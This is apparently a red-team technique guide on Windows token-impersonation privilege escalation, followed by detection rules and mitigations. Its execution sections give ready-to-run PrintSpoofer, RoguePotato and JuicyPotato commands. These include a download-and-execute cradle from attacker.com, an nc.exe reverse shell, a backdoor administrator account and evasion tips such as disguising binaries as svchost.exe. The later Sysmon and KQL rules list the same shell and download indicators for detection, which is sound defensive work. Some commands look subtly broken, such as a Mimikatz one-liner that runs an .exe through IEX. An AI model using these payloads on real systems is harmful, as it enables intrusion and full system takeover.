# [PE-TOKEN-001]: Token Impersonation Privilege Escalation

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | PE-TOKEN-001 |
| **MITRE ATT&CK v18.1** | [T1134.001 - Access Token Manipulation: Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Windows Endpoint (Windows Server 2016-2025, Windows 8.1+) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | Windows Server 2016, 2019, 2022, 2025; Windows 8.1, 10, 11 |
| **Patched In** | Not applicable (privilege-based, not patched) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Token impersonation is a privilege escalation technique that abuses the **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege** user rights to duplicate and assume the security context of another user's access token. An attacker with these privileges can extract a token from a legitimate process (often SYSTEM), duplicate it using Windows APIs (`DuplicateTokenEx`, `DuplicateToken`), and then impersonate that token to execute code with elevated privileges. This technique is particularly effective against Windows service accounts (NETWORK SERVICE, LOCAL SERVICE) that have these privileges by default, enabling privilege escalation from a compromised service context to SYSTEM-level execution.

**Attack Surface:** Local system access to processes running with SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. The Print Spooler service (running as SYSTEM), WinRM, COM+ Application Server, IIS Application Pools, and other Windows services are common targets.

**Business Impact:** **Critical – Complete system compromise.** Successful token impersonation allows attackers to execute arbitrary code with SYSTEM privileges, enabling them to install malware, steal credentials, modify system configurations, create persistent backdoors, and compromise the entire Windows infrastructure.

**Technical Context:** Token impersonation typically takes seconds to execute once the right process is identified. Detection is challenging because the technique relies on legitimate Windows APIs and may not leave obvious artifacts depending on logging configurations. This is considered a "living off the land" attack when combined with native Windows tools (PowerShell, cmd.exe).

### Operational Risk
- **Execution Risk:** Medium – Requires identifying a process with the target privileges and craft appropriate API calls; exploitation is reliable on supported systems.
- **Stealth:** Medium – Generates Event ID 4688 (Process Creation) if auditing is enabled; impersonation itself leaves minimal logs unless advanced ETW tracing is configured.
- **Reversibility:** No – Once code executes as SYSTEM, it can make permanent changes (create admin accounts, disable defenses, install persistence).

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Control 6.2 / 7.2 | Ensure Least Privilege: Limit SeImpersonatePrivilege to service accounts only; enforce principle of least privilege |
| **DISA STIG** | WN10-AU-000505 | Audit Policy - Privilege Use must be audited for token/privilege-related calls |
| **CISA SCuBA** | ConfigurationBaseline-5.2 | Privilege Escalation Prevention: Restrict token manipulation capabilities |
| **NIST 800-53** | AC-2 Account Management, AC-6 Least Privilege | Implement least privilege principle; restrict SeImpersonatePrivilege to authorized service accounts |
| **GDPR** | Article 32 | Security of Processing: Implement technical/organizational measures to prevent unauthorized privilege escalation |
| **DORA** | Article 9 - Protection and Prevention | Establish robust security controls for privilege management and access control |
| **NIS2** | Article 21 - Cyber Risk Management Measures | Implement controls for managing privileged access and detecting privilege escalation attempts |
| **ISO 27001** | A.9.2.3 - Management of Privileged Access Rights | Review and restrict privileged user rights; establish monitoring of privilege escalation |
| **ISO 27005** | Risk Scenario: "Privilege Escalation via Token Abuse" | Identify and mitigate risks associated with token manipulation and unauthorized privilege elevation |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:**
- **SeImpersonatePrivilege** (Primary) – Allows a thread to impersonate another process's security context after authentication
- **SeAssignPrimaryTokenPrivilege** (Alternative) – Allows assignment of a primary token to a process
- Local code execution (compromised service account or low-privilege user)

**Required Access:**
- Local access to a compromised process running with one of the above privileges
- Access to a process handle for a target process running under a higher-privileged user (typically SYSTEM)

**Supported Versions:**
- **Windows:** Server 2016, 2019, 2022, 2025; Windows 8.1+
- **PowerShell:** Version 3.0+ (for PowerShell-based tooling)
- **Other Requirements:** Print Spooler service running (for PrintSpoofer/RoguePotato methods), or DCOM server accessibility

**Tools:**
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) (Latest: v1.4, Supports Windows Server 2019+)
- [RoguePotato](https://github.com/antonioCoco/RoguePotato) (Supports Windows Server 2019, 2022+)
- [JuicyPotato](https://github.com/ohpe/juicy-potato) (Supports Windows Server 2016-2019; DEPRECATED on Server 2019+)
- [GodPotato](https://github.com/BeichenDream/GodPotato) (Supports Windows Server 2019-2022)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) – Module: `token::*`
- Native Windows APIs (via C#, C++, or PowerShell via P/Invoke)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### PowerShell Reconnaissance

**Identify SeImpersonatePrivilege in Current Process:**

```powershell
# Check if current process has SeImpersonatePrivilege
whoami /priv | findstr /I "SeImpersonatePrivilege"

# Output example:
# SeImpersonatePrivilege       Enabled
```

**Expected Output:** If "Enabled" is present, the current process has the privilege needed for token impersonation.

**Alternative – Check Privileges via Whoami:**

```powershell
whoami /priv /fo list | findstr SeImpersonatePrivilege
```

**What to Look For:**
- `Enabled` = Privilege is active; token impersonation is feasible
- `Disabled` = Privilege exists but is disabled; requires enabling or finding another vector
- No entry = Privilege not available; escalation via this method is not possible

**Version Note:** All Windows versions (Server 2016+) display privilege status via `whoami /priv`.

### Service Account Enumeration

**List Service Accounts with SeImpersonatePrivilege (Reconnaissance Phase):**

```powershell
# Query for services running with system privileges
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -match "Network|Local"} | Select-Object Name, StartName, State

# Output example:
# Name           : spooler
# StartName      : LocalSystem
# State          : Running
```

**What to Look For:**
- Services running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE
- Print Spooler, WinRM, IIS worker processes
- Any service in "Running" state (active target)

### Check if Print Spooler is Running

**For PrintSpoofer/RoguePotato Methods:**

```powershell
Get-Service -Name spooler | Select-Object Name, Status

# Output example:
# Name    Status
# ------  ------
# spooler Running
```

**Expected Output:** Status = "Running" means Print Spooler is available for exploitation.

**Alternative – Via PowerShell (Server 2022+):**

```powershell
Get-Service spooler -ErrorAction SilentlyContinue | Where-Object {$_.Status -eq 'Running'}
```

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: PrintSpoofer (Recommended for Windows Server 2019+)

**Supported Versions:** Windows Server 2019, 2022, 2025; Windows 10 (v1809+)

**Advantages:** Works reliably after Windows Server 2019 when JuicyPotato broke; minimal prerequisites (only Print Spooler required).

#### Step 1: Verify SeImpersonatePrivilege

**Objective:** Confirm the current process has SeImpersonatePrivilege before execution.

**Command:**

```powershell
whoami /priv | findstr /I "SeImpersonatePrivilege"
```

**Expected Output:**

```
SeImpersonatePrivilege       Enabled
```

**What This Means:**
- If "Enabled," proceed to Step 2
- If "Disabled" or not present, PrintSpoofer will fail with `[-] SeImpersonatePrivilege not found`

**OpSec & Evasion:**
- Use `whoami /priv > temp.txt && type temp.txt` to avoid direct console output if being monitored
- Delete temp.txt after verification
- Detection likelihood: Low for this reconnaissance step

**Troubleshooting:**
- **Error:** `[-] SeImpersonatePrivilege not found`
  - **Cause:** The current process doesn't have the privilege
  - **Fix (All Versions):** Run from a Windows service context (IIS app pool, compromised service) rather than user session

#### Step 2: Upload PrintSpoofer Binary

**Objective:** Transfer PrintSpoofer.exe to the target system for execution.

**Command (From Attacker Machine):**

```powershell
# Copy PrintSpoofer to target via SMB (requires file share access)
Copy-Item -Path "C:\Tools\PrintSpoofer.exe" -Destination "\\<TARGET_IP>\C$\Windows\Temp\" -Force
```

**Command (On Target – Verify Placement):**

```cmd
dir C:\Windows\Temp\PrintSpoofer.exe
```

**Expected Output:**

```
PrintSpoofer.exe exists
```

**OpSec & Evasion:**
- Use obfuscated names: `PrintSpoofer.exe` → `svchost.exe`, `rundll32.exe`, etc.
- Place in `C:\Windows\Temp` or `C:\ProgramData` (less monitored than user Desktop)
- Use living-off-the-land transfer methods (PowerShell WebClient, BITSAdmin) to avoid SMB detection
- Detection likelihood: High for file transfer; use HTTPS/encrypted channels

**Troubleshooting:**
- **Error:** Access denied creating file in C:\Windows\Temp
  - **Cause:** Insufficient permissions or folder locked
  - **Fix (All Versions):** Use `C:\ProgramData` or user temp folder instead (`C:\Users\<Username>\AppData\Local\Temp`)

#### Step 3: Execute PrintSpoofer to Escalate Privileges

**Objective:** Exploit the Print Spooler service to obtain a SYSTEM token and spawn a new process.

**Command:**

```cmd
C:\Windows\Temp\PrintSpoofer.exe -c "cmd.exe /c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
```

**Command Variants:**

**Reverse Shell (Example):**

```cmd
C:\Windows\Temp\PrintSpoofer.exe -c "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.10.10 4444"
```

**Add User (Persistence Example):**

```cmd
C:\Windows\Temp\PrintSpoofer.exe -c "cmd /c net user hacker Password123! /add && net localgroup administrators hacker /add"
```

**Expected Output (Success):**

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
NULL
```

**What This Means:**
- `[+] Found privilege` = SeImpersonatePrivilege detected
- `[+] Named pipe listening` = Print Spooler connected and is communicating
- `[+] CreateProcessAsUser() OK` = Process spawned with SYSTEM privileges
- `NULL` = New process created (your command executed as SYSTEM)

**OpSec & Evasion:**
- Execute from a non-interactive service account context (NETWORK SERVICE)
- Use obfuscated payload URLs to avoid detection by proxy/firewall
- Avoid suspicious command combinations; use legitimate executables (svchost.exe parent)
- Detection likelihood: Medium-High (Event 4688 process creation, but parent may be legitimate)

**Troubleshooting:**
- **Error:** `[-] Access denied opening pipe`
  - **Cause:** Print Spooler service not running or access denied
  - **Fix (All Versions):** Restart Print Spooler: `net start spooler`
  - **Fix (Server 2016):** Use RoguePotato or JuicyPotato instead

- **Error:** `[-] Error spawning process`
  - **Cause:** Impersonation level insufficient or payload syntax error
  - **Fix (All Versions):** Verify payload command with `cmd /c <command>` first without PrintSpoofer

#### Step 4: Verify Exploitation Success

**Objective:** Confirm that your payload executed with SYSTEM privileges.

**Command (On Victim):**

```powershell
# If reverse shell succeeded, verify from attacker machine:
whoami
# Output: NT AUTHORITY\SYSTEM
```

**Expected Output:** `NT AUTHORITY\SYSTEM` confirms SYSTEM-level code execution.

**Alternative – Check Event Logs:**

```powershell
Get-EventLog -LogName Security -InstanceId 4688 -Newest 5 | Select-Object TimeGenerated, Message | Format-List
```

**Look for Event 4688** with:
- **ParentImage:** Related to Print Spooler or your tool
- **NewProcessName:** Your spawned command
- **User:** SYSTEM

---

### METHOD 2: RoguePotato (Alternative for Windows Server 2019+)

**Supported Versions:** Windows Server 2019, 2022, 2025; Windows 10 (v1809+)

**Advantages:** Works when PrintSpoofer fails; uses DCOM server instead of Print Spooler; lower success rate but sometimes more reliable.

#### Step 1: Set Up Attacker Infrastructure

**Objective:** Create a fake OXID resolver to redirect DCOM connections.

**On Attacker Machine (Kali Linux):**

```bash
# Install socat if not present
apt-get install socat -y

# Start socat listener on port 135 (redirects to fake OXID server on 9999)
socat -v TCP-LISTEN:135,reuseaddr,fork TCP:127.0.0.1:9999
```

**Expected Output:** Socat waits for connections and redirects them to port 9999.

**What This Means:**
- Socat acts as a man-in-the-middle, intercepting DCOM resolution requests
- Port 135 = Windows RPC Endpoint Mapper
- Port 9999 = Fake OXID RPC server (built into RoguePotato)

**OpSec & Evasion:**
- Use non-standard ports (8135 instead of 135) if port 135 is monitored
- Run socat in a background screen session: `screen -d -m socat -v TCP-LISTEN:135,reuseaddr,fork TCP:127.0.0.1:9999`
- Detection likelihood: High for outbound RPC on port 135

#### Step 2: Upload RoguePotato Binary

**Objective:** Transfer RoguePotato.exe to the target system.

**Command (From Attacker):**

```powershell
# Upload via SMB
Copy-Item -Path ".\RoguePotato.exe" -Destination "\\<TARGET_IP>\C$\Windows\Temp\" -Force
```

**Expected Output:** File copied successfully.

#### Step 3: Execute RoguePotato

**Objective:** Exploit DCOM to obtain SYSTEM token.

**Command (On Target):**

```cmd
C:\Windows\Temp\RoguePotato.exe -r <ATTACKER_IP> -c "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.10.10 4444" -l 9999
```

**Command Breakdown:**
- `-r <ATTACKER_IP>` = Attacker IP hosting socat listener
- `-c "<COMMAND>"` = Command to execute as SYSTEM
- `-l 9999` = Local port where RoguePotato's fake OXID server listens

**Expected Output (Success):**

```
[*] Exploit starting...
[*] OXID resolver listening on port 9999
[*] DCOM server connected
[*] Token impersonated, executing command...
[*] Command executed with SYSTEM privileges
```

**OpSec & Evasion:**
- Requires outbound connectivity to attacker IP on port 9999 (often allowed for legitimate RPC)
- Use HTTPS/encrypted reverse shell to avoid command interception
- Detection likelihood: Medium (outbound RPC, but may blend with legitimate traffic)

**Troubleshooting:**
- **Error:** `[-] Failed to connect to OXID resolver`
  - **Cause:** Socat not running or attacker IP/port unreachable
  - **Fix:** Verify socat is running: `ps aux | grep socat`; check firewall rules

---

### METHOD 3: JuicyPotato (Deprecated on Server 2019+, but still works on Server 2016)

**Supported Versions:** Windows Server 2016, Windows 8.1, Windows 10 (up to 1809)

**Disadvantages:** Broken on Windows Server 2019 (April 2018 patches); provided for reference only.

#### Step 1: Identify CLSID for Target Service

**Objective:** Find a valid CLSID (COM class ID) for a service running as SYSTEM.

**Command:**

```powershell
# Common CLSIDs for SYSTEM services
# 6d61e65c-36f8-11e0-aec6-08002b37bcc9 (Print Spooler)
# Provided with JuicyPotato tool
```

**Expected Output:** CLSID list (provided in tool documentation).

#### Step 2: Execute JuicyPotato

**Objective:** Exploit COM instantiation to impersonate SYSTEM token.

**Command:**

```cmd
C:\Windows\Temp\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\cmd.exe -t * -c "6d61e65c-36f8-11e0-aec6-08002b37bcc9"
```

**Command Breakdown:**
- `-l 1337` = Local listening port
- `-p <COMMAND>` = Program to execute as SYSTEM
- `-t *` = Token type (either "t" for primary or "u" for impersonation; "*" tries both)
- `-c <CLSID>` = COM class ID for target service

**Expected Output (Success):**

```
[+] Privilege escalation successful
[+] Process running as NT AUTHORITY\SYSTEM
```

**Troubleshooting:**
- **Error:** `[-] JuicyPotato failed on this version`
  - **Cause:** Running on Windows Server 2019+ (unsupported)
  - **Fix:** Switch to PrintSpoofer or RoguePotato

---

## 6. TOOLS & COMMANDS REFERENCE

### [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

**Version:** 1.4 (Latest)

**Minimum Version:** 1.0

**Supported Platforms:** Windows Server 2019, 2022, 2025; Windows 10 (v1809+)

**Installation:**

```bash
# Clone repository
git clone https://github.com/itm4n/PrintSpoofer.git
cd PrintSpoofer

# Compile (requires Visual Studio Build Tools)
msbuild PrintSpoofer.sln /p:Configuration=Release /p:Platform=x64

# Binary location: Release\PrintSpoofer.exe
```

**Quick Execution:**

```cmd
PrintSpoofer.exe -c "whoami"
```

---

### [RoguePotato](https://github.com/antonioCoco/RoguePotato)

**Version:** 1.3+

**Supported Platforms:** Windows Server 2019, 2022, 2025; Windows 10 (v1809+)

**Installation:**

```bash
git clone https://github.com/antonioCoco/RoguePotato.git
cd RoguePotato

# Compile
msbuild RoguePotato.sln /p:Configuration=Release /p:Platform=x64
```

**Usage Example:**

```cmd
RoguePotato.exe -r 192.168.1.100 -c "cmd.exe /c powershell.exe -nop -c 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/shell.ps1\")'"
```

---

### [GodPotato](https://github.com/BeichenDream/GodPotato)

**Version:** 1.5+

**Supported Platforms:** Windows Server 2019-2022, Windows 10+

**Installation:**

```bash
git clone https://github.com/BeichenDream/GodPotato.git
cd GodPotato

# Compile
go build -o GodPotato.exe main.go
```

**Advantage:** Single binary, no external socat needed.

---

### One-Liner Scripts

**PowerShell One-Liner (Token Impersonation via Mimikatz):**

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gentilkiwi/mimikatz/master/x64/mimikatz.exe'); token::list
```

**Bash One-Liner (RoguePotato from Linux):**

```bash
# Transfer and execute RoguePotato (Linux relay to Windows target)
smbclient -U 'DOMAIN\user' //TARGET_IP/C$ -c "put RoguePotato.exe Windows/Temp/" && ssh root@TARGET_IP "C:\Windows\Temp\RoguePotato.exe -r ATTACKER_IP -c 'cmd.exe /c whoami' -l 9999"
```

---

## 7. WINDOWS EVENT LOG MONITORING

**Event ID: 4688 (A new process has been created)**

- **Log Source:** Security
- **Trigger:** Process creation from service account with SYSTEM output
- **Filter:** `CommandLine contains "spooler" OR NewProcessName contains "cmd.exe"` AND `User = "NT AUTHORITY\SYSTEM"`
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation** (Set to **Success and Failure**)
4. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Server 2022+):**

1. [Same as above; behavior unchanged]

**Manual Configuration Steps (Local Policy):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to: **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation** (Set to **Success and Failure**)
4. Run command: `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`

**Event Fields to Monitor:**

| Field | Value to Detect |
|---|---|
| **EventID** | 4688 |
| **NewProcessName** | cmd.exe, powershell.exe, nc.exe (reverse shells) |
| **ParentImage** | spoolsv.exe, dllhost.exe, rpcss.exe (legitimate service parents but with SYSTEM token) |
| **User** | NT AUTHORITY\SYSTEM (when parent is service account) |
| **CommandLine** | Suspicious: `-nop -w hidden`, `IEX`, `DownloadString`, RPC calls |

---

## 8. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+

**Supported Platforms:** All Windows versions

**Sysmon XML Configuration (Detect Process Access & Token Operations):**

```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Rule: Detect process access to lsass or spooler (token theft precursor) -->
    <RuleGroup name="Token Impersonation - Process Access" groupRelation="and">
      <ProcessAccess onmatch="include">
        <!-- Monitor access to Print Spooler -->
        <TargetImage condition="is">C:\Windows\System32\spoolsv.exe</TargetImage>
        <GrantedAccess condition="contains">0x40</GrantedAccess> <!-- VM_READ/PROCESS_VM_READ -->
      </ProcessAccess>
      <ProcessAccess onmatch="include">
        <!-- Monitor access to LSASS (alternative token source) -->
        <TargetImage condition="contains">lsass.exe</TargetImage>
        <GrantedAccess condition="contains">0x1010</GrantedAccess> <!-- PROCESS_QUERY_INFORMATION | PROCESS_VM_READ -->
      </ProcessAccess>
    </RuleGroup>

    <!-- Rule: Detect suspicious process creation from service accounts -->
    <RuleGroup name="Token Impersonation - Suspicious Process Creation" groupRelation="and">
      <ProcessCreate onmatch="include">
        <ParentImage condition="is">C:\Windows\System32\spoolsv.exe</ParentImage>
        <User condition="is">NT AUTHORITY\SYSTEM</User>
        <!-- But parent is spooler (normally doesn't spawn children) -->
        <Image condition="is">C:\Windows\System32\cmd.exe</Image>
      </ProcessCreate>
    </RuleGroup>

    <!-- Rule: Detect named pipe creation (RoguePotato/PrintSpoofer vectors) -->
    <RuleGroup name="Token Impersonation - Named Pipe" groupRelation="and">
      <PipeEvent onmatch="include">
        <EventType condition="is">CreatePipe</EventType>
        <PipeName condition="contains">pipe\spoolss</PipeName> <!-- PrintSpoofer vector -->
      </PipeEvent>
    </RuleGroup>
  </EventFiltering>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Save the XML config above as `sysmon-config.xml`
3. Install with config: `sysmon64.exe -accepteula -i sysmon-config.xml`
4. Verify installation: `Get-Service Sysmon64` → should show "Running"
5. View events: `Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 50 | Format-Table TimeCreated, Message`

---

## 9. MICROSOFT SENTINEL DETECTION

### Detection Query 1: Suspicious Service Account Process Creation

**Rule Configuration:**
- **Required Table:** SecurityEvent
- **Required Fields:** EventID, NewProcessName, ParentProcessName, User, CommandLine
- **Alert Severity:** High
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** All (Azure AD-connected Windows machines)

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4688
| where NewProcessName in ("cmd.exe", "powershell.exe", "svchost.exe", "rundll32.exe")
| where ParentProcessName in ("spoolsv.exe", "dllhost.exe", "rpcss.exe", "wininit.exe")
| where Account contains "NT AUTHORITY\\SYSTEM" or Account contains "NETWORK SERVICE"
| where CommandLine contains any ("iex", "DownloadString", "-nop", "-w hidden", "nc.exe", "IEX")
| project TimeGenerated, Computer, Account, NewProcessName, ParentProcessName, CommandLine, EventID
| where isnotempty(CommandLine)
```

**What This Detects:**
- Process creation (4688) from service accounts (NETWORK SERVICE, LOCAL SERVICE)
- Suspicious parents: spooler, DCOM, RPC services spawning cmd/PowerShell
- CommandLine contains obfuscation/download indicators
- Correlates privilege escalation vector (token impersonation) with command execution

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Token Impersonation - Service Account Process Creation`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
5. **Incident settings Tab:**
   - Enable **Create incidents**
   - Group related alerts: **By Alert Name**
6. Click **Review + create**

---

### Detection Query 2: Print Spooler Exploitation Attempt (PrintSpoofer)

**Rule Configuration:**
- **Required Table:** SecurityEvent, DeviceProcessEvents (MDE integration)
- **Required Fields:** EventID, Image, CommandLine, ParentImage
- **Alert Severity:** Critical
- **Frequency:** Real-time (1 minute)

**KQL Query:**

```kusto
SecurityEvent
| where EventID == 4688
| where ParentProcessName contains "spoolsv.exe"
| where CommandLine contains any ("PrintSpoofer", "-c", "CreateProcessAsUser")
| union (DeviceProcessEvents | where ParentProcessName contains "spoolsv.exe")
| project TimeGenerated, Computer, ParentProcessName, NewProcessName, CommandLine, User
```

**Manual Configuration Steps (PowerShell):**

```powershell
Connect-AzAccount
$ResourceGroup = "YourResourceGroup"
$WorkspaceName = "YourSentinelWorkspace"

$query = @"
SecurityEvent
| where EventID == 4688
| where ParentProcessName contains "spoolsv.exe"
| where CommandLine contains any ("PrintSpoofer", "-c", "CreateProcessAsUser")
"@

New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "Token Impersonation - PrintSpoofer Detection" `
  -Query $query `
  -Severity "Critical" `
  -Enabled $true
```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

### Detection Alerts

**Alert Name:** Suspicious process creation with elevated privileges from service account

- **Severity:** Critical
- **Description:** MDC detects when a process running as a service account (NETWORK SERVICE, LOCAL SERVICE) spawns a child process with SYSTEM-level privileges, indicating potential token impersonation
- **Applies To:** All subscriptions with Defender for Servers enabled

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings** → Select your subscription
3. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Endpoint Integration**: ON (if available)
4. Click **Save**
5. Go to **Security alerts** → Filter by "Token Impersonation" or "Process Creation"

**Response to Alert:**
1. Check the process: `tasklist /v | findstr <PID>`
2. Kill the process: `taskkill /PID <PID> /F`
3. Investigate process execution context (privilege level)

---

## 11. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**1. Restrict SeImpersonatePrivilege to Authorized Service Accounts Only**

Service accounts should have SeImpersonatePrivilege assigned, but user accounts should not. Regularly audit who has this privilege.

**Applies To Versions:** Server 2016+

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **User Rights Assignment**
3. Double-click: **Impersonate a client after authentication**
4. Remove all users except necessary service accounts (e.g., NETWORK SERVICE)
5. Click **Apply** → **OK**
6. Run `gpupdate /force` on target machines

**Manual Steps (PowerShell):**

```powershell
# Remove SeImpersonatePrivilege from a user
$computer = $env:COMPUTERNAME
$user = "DOMAIN\Username"

# Via ntrights.exe (requires RSAT)
ntrights -u $user -r SeImpersonatePrivilege

# Alternative: Edit Group Policy directly
$policy = "C:\Windows\System32\drivers\etc\hosts"  # Placeholder; actual GPO path is complex
```

**Validation Command (Verify Fix):**

```powershell
# Check who has SeImpersonatePrivilege
Get-LocalGroupMember -Group "Administrators" | Select-Object Name
# Should NOT include normal user accounts
```

**Expected Output (If Secure):**

```
Name                              ObjectClass
----                              -----------
DOMAIN\Admins                      Group
NT AUTHORITY\SYSTEM               User
```

**What to Look For:**
- Only system accounts and admin service accounts listed
- Regular users or service accounts with elevated privileges removed

---

**2. Disable or Minimize Print Spooler Service**

The Print Spooler service is the primary vector for PrintSpoofer. Disable it if not required.

**Applies To Versions:** Server 2016+

**Manual Steps:**

1. Open **Services** (services.msc)
2. Locate: **Print Spooler**
3. Right-click → **Properties**
4. Set **Startup type** to **Disabled**
5. Click **Stop** → **Apply** → **OK**

**Manual Steps (PowerShell):**

```powershell
# Disable Print Spooler
Set-Service -Name spooler -StartupType Disabled -Force
Stop-Service -Name spooler -Force

# Verify disabled
Get-Service spooler | Select-Object Name, StartType, Status
```

**Validation Command:**

```powershell
Get-Service spooler | Select-Object StartType, Status
# Output: StartType = Disabled, Status = Stopped
```

---

**3. Enable Privilege Use Auditing**

Monitor who uses SeImpersonatePrivilege and other sensitive privileges.

**Applies To Versions:** Server 2016+

**Manual Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies** → **Privilege Use**
3. Enable: **Audit Sensitive Privilege Use** (Set to **Success and Failure**)
4. Run `gpupdate /force`

**Manual Steps (Local Policy):**

```powershell
auditpol /set /subcategory:"Sensitive Privilege Use" /success:enable /failure:enable
```

**Validation Command:**

```powershell
auditpol /get /subcategory:"Sensitive Privilege Use"
# Output: Success and Failure enabled
```

---

### Priority 2: HIGH

**4. Implement Application Whitelisting**

Prevent unsigned or unauthorized executables (PrintSpoofer, RoguePotato, JuicyPotato) from running.

**Applies To Versions:** Server 2016+

**Manual Steps (Windows Defender Application Guard):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to: **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Device Guard** → **Turn On Virtualization Based Security**
3. Set to **Enabled**
4. Click **Apply** → **OK**

**Manual Steps (PowerShell – AppLocker):**

```powershell
# Create AppLocker policy to block .exe files in Temp directory
$rule = New-AppLockerRule -Path "C:\Windows\Temp\*.exe" -Action Deny -User Everyone -Optimize

# Apply policy
Set-AppLockerPolicy -PolicyObject $rule -Enforce
```

---

**5. Network Segmentation & RPC Restrictions**

Limit RPC communication (port 135, 445) between service accounts and external systems.

**Manual Steps (Windows Firewall):**

1. Open **Windows Defender Firewall with Advanced Security** (wf.msc)
2. Click **Outbound Rules** → **New Rule**
3. **Rule Type:** Port
4. **Action:** Block
5. **Protocol:** TCP/UDP
6. **Port:** 135, 445
7. **Direction:** Outbound
8. **Apply to:** Specific user/service accounts (if applicable)
9. Click **Finish**

---

**6. Conditional Access (Entra ID/Hybrid)**

Block token impersonation in hybrid AD environments by enforcing Conditional Access policies.

**Manual Steps:**

1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. Name: `Block Sensitive Privilege Operations`
4. **Assignments:**
   - Users: All users
   - Cloud apps: All cloud apps
5. **Conditions:**
   - Sign-in risk: High
   - Device state: Non-compliant
6. **Access controls:**
   - Grant: **Block access**
7. Enable policy: **On**
8. Click **Create**

---

**Validation Command (Verify All Fixes):**

```powershell
# Comprehensive audit script
Write-Host "[*] Checking SeImpersonatePrivilege restrictions..."
whoami /priv | findstr /I "SeImpersonatePrivilege"

Write-Host "[*] Checking Print Spooler status..."
Get-Service spooler | Select-Object Status, StartType

Write-Host "[*] Checking Privilege Use auditing..."
auditpol /get /subcategory:"Sensitive Privilege Use"

Write-Host "[*] Checking AppLocker policy..."
Get-AppLockerPolicy -Effective | Format-List
```

**Expected Output (If All Secure):**
- SeImpersonatePrivilege: Not found or Disabled
- Print Spooler: Stopped, Disabled
- Privilege Use auditing: Success and Failure enabled
- AppLocker: Blocking rules for Temp/suspicious paths

---

## 12. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- `PrintSpoofer.exe` (various obfuscated names)
- `RoguePotato.exe`, `GodPotato.exe`, `JuicyPotato.exe`
- `mimikatz.exe`, `procdump.exe`, `psexec.exe` (post-exploitation)
- `C:\Windows\Temp\*.exe` (staging directory)
- `C:\ProgramData\SkyPDF\PDUDrv.blf` (CLFS exploit artifact – CVE-2025-29824)

**Registry:**
- `HKLM\System\CurrentControlSet\Services\spooler` (Print Spooler state)
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (persistence keys)

**Network:**
- Outbound RPC (port 135) to attacker IP
- DCOM queries to unknown hosts (RoguePotato)
- HTTP/HTTPS downloads of tools or payloads

**Event Logs:**
- **Event ID 4688** (Process Creation) with SYSTEM token from service account parent
- **Event ID 4689** (Process Termination) of suspicious child processes
- **Event ID 4624** (Logon) with Logon Type 3 (Network) from service account
